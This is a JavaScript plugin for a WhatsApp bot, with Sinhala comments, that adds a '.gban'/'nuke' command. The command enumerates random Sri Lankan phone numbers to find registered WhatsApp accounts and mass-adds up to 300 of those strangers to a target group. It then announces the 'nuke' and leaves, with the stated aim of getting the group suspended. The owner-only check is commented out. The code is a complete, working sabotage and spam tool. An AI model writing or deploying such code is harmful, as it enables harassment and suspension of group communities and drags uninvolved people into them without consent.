// ================================================================
// 📦 ADVANCED GROUP BAN PLUGIN (For SHAVIYA-XMD Bot Base)
// ================================================================

const { cmd } = require('../command');

// ================================================================
// 1. CONFIGURATION
// ================================================================

const CONFIG = {
  COUNTRY_CODE: '94',              // රටේ කේතය (ශ්‍රී ලංකාව = 94)
  TOTAL_TO_GENERATE: 300,          // Generate කරන මුළු numbers ගණන
  BATCH_SIZE_CHECK: 50,            // Register check එකේදී එක පාරට check කරන ගණන
  ADD_BATCH_SIZE: 150,             // එක පාරට Add කරන ගණන (150)
  DELAY_BETWEEN_ADDS: 200,         // Add කිරීම් අතර ප්‍රමාදය (Ultra Fast = 200ms)
  DELAY_BETWEEN_CHECKS: 100,       // Register checks අතර ප්‍රමාදය
};

// ================================================================
// 2. UTILITY FUNCTIONS
// ================================================================

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function generateRandomNumbers(count) {
  const numbers = new Set();
  while (numbers.size < count) {
    const randomDigits = Math.floor(Math.random() * 1000000000)
                             .toString()
                             .padStart(9, '0');
    const fullNumber = CONFIG.COUNTRY_CODE + randomDigits;
    if (fullNumber.length >= 10 && fullNumber.length <= 15) {
      numbers.add(fullNumber);
    }
  }
  return Array.from(numbers);
}

// ================================================================
// 3. REGISTER CHECK FUNCTION
// ================================================================

async function getRegisteredJids(sock, numbers) {
  const registeredJids = [];
  console.log(`🔍 Checking ${numbers.length} numbers for WhatsApp registration...`);
  
  for (let i = 0; i < numbers.length; i += CONFIG.BATCH_SIZE_CHECK) {
    const batch = numbers.slice(i, i + CONFIG.BATCH_SIZE_CHECK);
    try {
      const result = await sock.onWhatsApp(batch);
      if (result && Array.isArray(result)) {
        for (const item of result) {
          if (item.exists && item.jid) {
            registeredJids.push(item.jid);
          }
        }
      }
      console.log(`✅ Checked batch: Found ${registeredJids.length} registered so far.`);
    } catch (error) {
      console.error('Registration check error:', error);
    }
    await delay(CONFIG.DELAY_BETWEEN_CHECKS);
  }
  console.log(`✅ Total registered numbers found: ${registeredJids.length}`);
  return registeredJids;
}

// ================================================================
// 4. GET GROUP JID FROM INVITE LINK
// ================================================================

async function getGroupJidFromInvite(sock, inviteCode) {
  try {
    const groupInfo = await sock.groupGetInviteInfo(inviteCode);
    if (groupInfo && groupInfo.id) {
      return groupInfo.id;
    }
    return null;
  } catch (error) {
    console.error('Error fetching group info:', error);
    return null;
  }
}

// ================================================================
// 5. MAIN GROUP BAN FUNCTION (Improved Error Handling)
// ================================================================

async function groupBan(sock, target, inviteCode = null) {
  if (!target.endsWith("@g.us")) {
    throw new Error("@g.us server required");
  }

  // Step 1: Try to get group metadata
  let groupMetadata;
  try {
    groupMetadata = await sock.groupMetadata(target);
  } catch (error) {
    // If metadata fails, maybe the bot is not in the group yet
    if (inviteCode) {
      console.log('Bot not in group, attempting to join via invite...');
      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log('✅ Successfully joined the group via invite.');
        // After joining, fetch metadata again
        groupMetadata = await sock.groupMetadata(target);
      } catch (joinErr) {
        throw new Error(`Failed to join group via invite: ${joinErr.message}`);
      }
    } else {
      throw new Error("Bot is not in the group and no invite code provided.");
    }
  }

  const botId = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';

  // Step 2: Check if bot is admin
  const botIsAdmin = groupMetadata.participants.some(
    (p) => p.id === botId && (p.admin === 'admin' || p.admin === 'superadmin')
  );

  if (!botIsAdmin) {
    // If bot is not admin, we can try to join if we have an invite code and then prompt
    if (inviteCode) {
      // Try to join (maybe the bot left or wasn't admin)
      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log('✅ Joined via invite, but need to be promoted to admin.');
        // After joining, we still need admin rights; we can't add members
        throw new Error("Bot joined the group but is NOT an admin. Please promote the bot to admin and run the command again.");
      } catch (joinErr) {
        throw new Error(`Failed to join: ${joinErr.message}`);
      }
    } else {
      throw new Error("Bot is not an admin. Please promote the bot to admin, or provide an invite code and promote it after joining.");
    }
  }

  console.log('✅ Bot is admin. Proceeding with group nuke...');

  // Step 3: Generate & add members
  const randomNumbers = generateRandomNumbers(CONFIG.TOTAL_TO_GENERATE);
  console.log(`📱 Generated ${randomNumbers.length} random numbers.`);

  const registeredJids = await getRegisteredJids(sock, randomNumbers);
  
  if (registeredJids.length === 0) {
    throw new Error("No registered WhatsApp numbers found in the generated list!");
  }

  const targetCount = Math.min(CONFIG.ADD_BATCH_SIZE, registeredJids.length);
  const toAdd = registeredJids.slice(0, targetCount);
  
  console.log(`🚀 Attempting to add ${toAdd.length} registered numbers to the group...`);

  try {
    await sock.groupParticipantsUpdate(target, toAdd, "add");
    console.log(`✅ Successfully added ${toAdd.length} members in ONE BATCH!`);
    
    if (registeredJids.length > targetCount) {
      const secondBatch = registeredJids.slice(targetCount, targetCount + CONFIG.ADD_BATCH_SIZE);
      if (secondBatch.length > 0) {
        console.log(`🚀 Adding second batch of ${secondBatch.length} members...`);
        await delay(CONFIG.DELAY_BETWEEN_ADDS);
        await sock.groupParticipantsUpdate(target, secondBatch, "add");
        console.log(`✅ Added second batch!`);
      }
    }
    
    console.log('💣 Leaving group to finalize nuke...');
    await delay(500);
    await sock.sendMessage(target, { text: "💥 This group is being nuked! Goodbye." });
    await sock.groupLeave(target);
    
    console.log(`✅ Group ${target} has been successfully nuked and bot left.`);
    
  } catch (error) {
    console.error('Add or Leave error:', error);
    try {
      await sock.groupLeave(target);
    } catch (e) {}
    throw new Error(`Failed to add members: ${error.message}`);
  }
}

// ================================================================
// 6. COMMAND HANDLER (.gban) – WITH IMPROVED ERROR MESSAGES
// ================================================================

cmd({
    pattern: "gban",
    alias: ["nuke", "destroygroup", "suspend"],
    react: "💣",
    desc: "Add 150+ registered random numbers to suspend the group.",
    category: "admin",
    filename: __filename
},
async (conn, mek, m, { from, reply, args, isOwner }) => {
    let targetGroup = null;
    let inviteCode = null;

    try {
        // Optional owner-only check (uncomment if needed)
        // if (!isOwner) return reply("❌ This command is for the bot owner only.");

        // Case 1: Command used in a group
        if (from.endsWith("@g.us")) {
            targetGroup = from;
            inviteCode = args[0] || null; // User may provide an invite code to rejoin if needed
        } 
        // Case 2: Command used in private chat – need to provide group link or JID
        else {
            if (!args[0]) {
                return reply(`❌ *Usage in private chat:*\n\nProvide a group invite link or group JID.\n\nExamples:\n\`.gban https://chat.whatsapp.com/XXXXX\`\n\`.gban 120363xxxxx@g.us\``);
            }
            const input = args[0];
            if (input.includes("chat.whatsapp.com/")) {
                const code = input.split("chat.whatsapp.com/")[1]?.split("/")[0]?.split("?")[0];
                if (!code) return reply("❌ Invalid invite link.");
                inviteCode = code;
                // Try to get group JID using invite info
                const groupJid = await getGroupJidFromInvite(conn, inviteCode);
                if (groupJid) {
                    targetGroup = groupJid;
                } else {
                    // If we can't get JID, we'll try to join and then use the group
                    // But we need a JID to add members; we can try to join and then get metadata
                    // We'll just store the inviteCode and try to join inside groupBan
                    targetGroup = null; // Will be resolved inside groupBan
                }
            } else if (input.endsWith("@g.us")) {
                targetGroup = input;
                inviteCode = args[1] || null; // optional invite code if bot not in group
            } else {
                return reply("❌ Invalid input. Please provide a group invite link or group JID.");
            }
        }

        // If targetGroup is still null, we must have an invite code to join first
        if (!targetGroup && !inviteCode) {
            return reply("❌ Could not determine target group. Please provide a valid group JID or invite link.");
        }

        // If targetGroup is null but we have an inviteCode, we'll try to join first
        if (!targetGroup && inviteCode) {
            // Attempt to join via invite to get the group JID
            try {
                await conn.groupAcceptInvite(inviteCode);
                // After joining, we need to get the group JID from the invite info again
                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
                if (groupInfo && groupInfo.id) {
                    targetGroup = groupInfo.id;
                } else {
                    return reply("❌ Successfully joined via invite, but could not retrieve group JID.");
                }
            } catch (joinErr) {
                return reply(`❌ Failed to join via invite: ${joinErr.message}`);
            }
        }

        // Final check
        if (!targetGroup) return reply("❌ Could not determine target group.");

        // Send initial message
        await reply(`🚀 Starting Group Nuke...\n📱 Generating random numbers...\n✅ Will add only REGISTERED WhatsApp numbers!\n⏳ Please wait...`);

        // Execute the ban
        await groupBan(conn, targetGroup, inviteCode);
        // If we reach here, the bot left the group, so we can't reply.
        // But we can try to send a final message if still in group.
        try {
            await reply("✅ Group nuke completed (bot may have left).");
        } catch (e) {}

    } catch (error) {
        console.error("Group Ban Error:", error);
        // Try to send error message if group still exists
        try {
            await reply(`❌ ${error.message || "Unknown error"}`);
        } catch (e) {
            console.log("Could not send error message (group likely suspended).");
        }
    }
});

// ================================================================
// 7. LOADED MESSAGE
// ================================================================

console.log('✅ Group Ban Plugin Loaded!');
console.log('📌 Command: .gban');
console.log('📌 Alias: .nuke, .destroygroup, .suspend');
console.log('📌 Usage (in group): .gban [invite_code_optional]');
console.log('📌 Usage (private): .gban <invite_link_or_group_JID>');
